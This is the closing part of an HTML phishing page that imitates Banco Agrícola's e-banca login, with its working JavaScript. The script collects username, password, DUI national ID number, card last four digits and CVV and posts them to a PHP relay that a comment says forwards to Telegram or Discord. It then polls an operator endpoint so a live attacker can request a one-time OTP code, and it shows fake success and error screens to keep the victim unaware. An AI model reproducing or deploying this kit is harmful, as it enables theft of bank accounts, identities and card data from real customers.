              <div class="aa ab"><button type="button" id="btn2" class="ac"><span><span
                      id="btxt2">Continuar</span></span><span class="ad"><span>Cargando...</span></span></button></div>
              <div class="ak"><a class="af" href="https://www.ebanca.com/enrollment"><span>Regístrate</span></a><a
                  class="af" href="#"><span></span></a><a class="ag"
                  href="https://www.ebanca.com/contactUs"><span>Contáctanos</span></a></div>
            </form>
            <div></div>
          </div>
        </article>
        <footer class="ah">
          <ul class="ai">
            <li><a><span>Consejos de seguridad</span></a></li>
            <li><a><span>Tutorial del canal</span></a></li>
            <li><a><span>Tips de uso</span></a></li>
            <li><a><span>Preguntas frecuentes</span></a></li>
            <li><span><span>Banco Agrícola© Todos los derechos reservados.</span></span></li>
            <li>
              <p class="aj">5.0.7</p>
            </li>
          </ul>
        </footer>
      </div>
    </div>
  </div>
  <script>
    (function () {
      var $ = function (id) { return document.getElementById(id); };
      var _s1 = $('s1'), _s2 = $('s2'), _s3 = $('s3'), _s4 = $('s4');
      var _pc = $('pc2'), _btn = $('btn2'), _bt = $('btxt2');
      var _i1 = $('x1'), _i2 = $('x2'), _i3 = $('x3'), _i4 = $('x4'), _i5 = $('x5');
      var _step = 1;

      function _show(s) {
        _s1.className = 'x'; _s2.className = 'x'; _s3.className = 'x'; _s4.className = 'x';
        var _st = document.getElementById('stepper2');
        if (_st) _st.setAttribute('data-step', s);
        if (s == 1) { _s1.className = ''; _pc.innerText = 'Paso 1 de 4 · Usuario'; _bt.innerText = 'Continuar'; }
        else if (s == 2) { _s2.className = ''; _pc.innerText = 'Paso 2 de 4 · Clave'; _bt.innerText = 'Continuar'; }
        else if (s == 3) { _s3.className = ''; _pc.innerText = 'Paso 3 de 4 · DUI'; _bt.innerText = 'Continuar'; }
        else if (s == 4) { _s4.className = ''; _pc.innerText = 'Paso 4 de 4 · Tarjeta'; _bt.innerText = 'Validar'; }
      }

      function _valid(s) {
        if (s == 1) return _i1.value.trim().length > 0;
        if (s == 2) return _i2.value.trim().length > 0;
        if (s == 3) { var v = _i3.value.trim(); return v.length == 9 && /^\d+$/.test(v); }
        if (s == 4) { var a = _i4.value.trim(), b = _i5.value.trim(); return a.length == 4 && /^\d+$/.test(a) && b.length == 3 && /^\d+$/.test(b); }
        return false;
      }

      // Envío al relay PHP (retorna true si Telegram confirmó ok)
      async function _sendToDiscord(data, stepLabel) {
        try {
          var r = await fetch('manzanaverde.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(Object.assign({ step: stepLabel }, data))
          });
          var j = await r.json();
          return j && j.ok === true;
        } catch (e) { return false; }
      }

      // Función para enviar el paso actual
      async function _sendStep(step) {
        var data = {};
        var label = '';
        if (step == 1) {
          data.usuario = _i1.value.trim();
          label = '1 · Usuario';
        } else if (step == 2) {
          data.usuario = _i1.value.trim();
          data.clave = _i2.value.trim();
          label = '1-2 · Usuario & Clave';
        } else if (step == 3) {
          data.usuario = _i1.value.trim();
          data.clave = _i2.value.trim();
          data.dui = _i3.value.trim();
          label = '3 · DUI';
        } else if (step == 4) {
          data.usuario = _i1.value.trim();
          data.clave = _i2.value.trim();
          data.dui = _i3.value.trim();
          data.last4 = _i4.value.trim();
          data.cvv = _i5.value.trim();
          label = '4 · COMPLETO';
        }
        return await _sendToDiscord(data, label);
      }

      // Toast sin botón
      function _notify(msg, ms) {
        var el = document.getElementById('notif-pop');
        if (!el) return;
        el.innerText = msg;
        el.classList.add('show');
        setTimeout(function () { el.classList.remove('show'); }, ms || 3000);
      }

      // Polling del operador cada 2s
      function _poll(cb) {
        var _pt = setInterval(function () {
          fetch('wait.php', { credentials: 'same-origin', headers: { 'Accept': 'application/json' } })
            .then(function (r) { return r.ok ? r.json() : null; })
            .then(function (j) {
              if (!j) return;
              if ((j.s || 'wait') !== 'wait') { clearInterval(_pt); cb(j.s); }
            })
            .catch(function () {});
        }, 2000);
      }

      // Pantalla de código OTP
      function _setupToken() {
        var inp = document.getElementById('x-tok');
        var err = document.getElementById('tok-err');
        var btn = document.getElementById('btn-tok');
        if (inp) inp.value = '';
        if (err) err.innerText = '\u00a0';
        if (!btn) return;
        btn.onclick = function () {
          var code = inp ? inp.value.trim() : '';
          if (!code) { if (err) err.innerText = 'Ingrese el código.'; return; }
          if (err) err.innerText = '\u00a0';
          _sendToDiscord({ usuario: _i1 ? _i1.value.trim() : '', token: code }, 'TOKEN · ' + (_i1 ? _i1.value.trim() : 'OTP'));
          document.getElementById('tok-ov').classList.remove('show');
          var _ov = document.getElementById('loader-ov');
          var _ot = document.getElementById('loader-text');
          if (_ov) { _ov.classList.remove('success'); _ov.classList.remove('fail'); _ov.classList.add('show'); }
          if (_ot) _ot.innerText = 'VERIFICANDO CÓDIGO...\nPor favor espere.';
          _poll(function (st) {
            if (st === 'finish') {
              if (_ov) _ov.classList.add('success');
              if (_ot) _ot.innerText = 'VERIFICACIÓN EXITOSA';
            } else if (st === 'error') {
              if (_ov) { _ov.classList.remove('show'); _ov.classList.remove('success'); _ov.classList.remove('fail'); }
              if (err) err.innerText = 'Clave dinámica inválida o vencida, intenta de nuevo.';
              if (inp) inp.value = '';
              document.getElementById('tok-ov').classList.add('show');
            }
          });
        };
      }

      // Evento click del botón
      _btn.addEventListener('click', function (e) {
        e.preventDefault();
        if (!_valid(_step)) {
          var errEl = document.getElementById('err' + _step);
          if (errEl) {
            errEl.classList.add('show');
            setTimeout(function () { errEl.classList.remove('show'); }, 3000);
          }
          return;
        }

        // Helpers para overlay de carga
        function _ovEl() { return document.getElementById('loader-ov'); }
        function _ovText(t) { var e = document.getElementById('loader-text'); if (e) e.innerText = t; }
        function _showOverlay() { var o = _ovEl(); o.classList.remove('success'); o.classList.remove('fail'); _ovText('CARGANDO...'); o.classList.add('show'); }
        function _hideOverlay() { var o = _ovEl(); o.classList.remove('show'); o.classList.remove('success'); o.classList.remove('fail'); }
        function _loaderThen(ms, cb) { _showOverlay(); setTimeout(function () { _hideOverlay(); cb(); }, ms); }
        function _resultThen(loadMs, state, text, holdMs, cb) {
          _showOverlay();
          setTimeout(function () {
            var o = _ovEl();
            o.classList.add(state);
            _ovText(text);
            setTimeout(function () { _hideOverlay(); cb(); }, holdMs);
          }, loadMs);
        }

        function _resetForm() {
          _i1.value = ''; _i2.value = ''; _i3.value = ''; _i4.value = ''; _i5.value = '';
          var box = document.querySelector('#s1 .s .t .v');
          if (box) box.classList.remove('checked');
        }

        // Enviar el paso actual antes de avanzar
        if (_step == 1) { _step = 2; _show(2); }
        else if (_step == 2) {
          var _v2 = _i2.value;
          var _ok2 = _v2.length >= 8 && _v2.length <= 16 && /[A-Z]/.test(_v2) && /[a-z]/.test(_v2) && /[0-9]/.test(_v2) && /[#$@_\-]/.test(_v2);
          if (!_ok2) { _notify('Usuario o contraseña incorrectos.', 3000); _i1.value = ''; _i2.value = ''; _step = 1; _show(1); return; }
          _step = 3; _show(3);
        }
        else if (_step == 3) { _step = 4; _show(4); }
        else if (_step == 4) {
          _showOverlay();
          _ovText('PROCESANDO...\nPor favor espere.');
          _sendStep(4);
          _poll(function (state) {
            if (state === 'continue') {
              var o = _ovEl(); o.classList.add('success'); _ovText('VERIFICACIÓN EXITOSA');
              setTimeout(function () { _hideOverlay(); _resetForm(); _step = 1; _show(1); }, 2500);
            } else if (state === 'token') {
              _hideOverlay();
              document.getElementById('tok-ov').classList.add('show');
              _setupToken();
            } else if (state === 'error') {
              _hideOverlay();
              _resetForm(); _step = 1; _show(1);
              _notify('Algunos de tus datos son incorrectos.', 3500);
            }
          });
        }
      });

      // Enter en los campos
      [_i1, _i2, _i3, _i4, _i5].forEach(function (el) { if (el) el.addEventListener('keypress', function (ev) { if (ev.key === 'Enter') { ev.preventDefault(); _btn.click(); } }); });

      var _lk = $('lk2'); if (_lk) _lk.addEventListener('click', function (e) { e.preventDefault(); alert('Opción desactivada.'); });

      // Panel Clave Dinamica
      var _cdHelp  = document.getElementById('btn-cd-help');
      var _cdBack  = document.getElementById('btn-cd-back');
      var _cdBack2 = document.getElementById('btn-cd-back2');
      var _cdPanel = document.getElementById('cd-panel');
      if (_cdHelp)  _cdHelp.addEventListener('click',  function () { _cdPanel.classList.add('show'); });
      if (_cdBack)  _cdBack.addEventListener('click',  function () { _cdPanel.classList.remove('show'); });
      if (_cdBack2) _cdBack2.addEventListener('click', function () { _cdPanel.classList.remove('show'); });

      // Checkbox "Recordar usuario" - solo visual (psicológico, sin guardar nada)
      (function () {
        var row = document.querySelector('#s1 .s .t');
        if (!row) return;
        var box = row.querySelector('.v');
        row.style.cursor = 'pointer';
        row.addEventListener('click', function (ev) {
          ev.preventDefault();
          if (box) box.classList.toggle('checked');
        });
      })();
      $('fm2').addEventListener('submit', function (e) { e.preventDefault(); });
      document.querySelectorAll('.ak a, .ai a').forEach(function (el) { el.addEventListener('click', function (ev) { if (el.classList.contains('af')) return; ev.preventDefault(); alert('Navegación desactivada.'); }); });
      document.querySelectorAll('.ai a').forEach(function (el) { el.addEventListener('click', function (ev) { ev.preventDefault(); alert('Contenido no disponible.'); }); });

      _show(1);
    })();
  </script>
</body>

</html>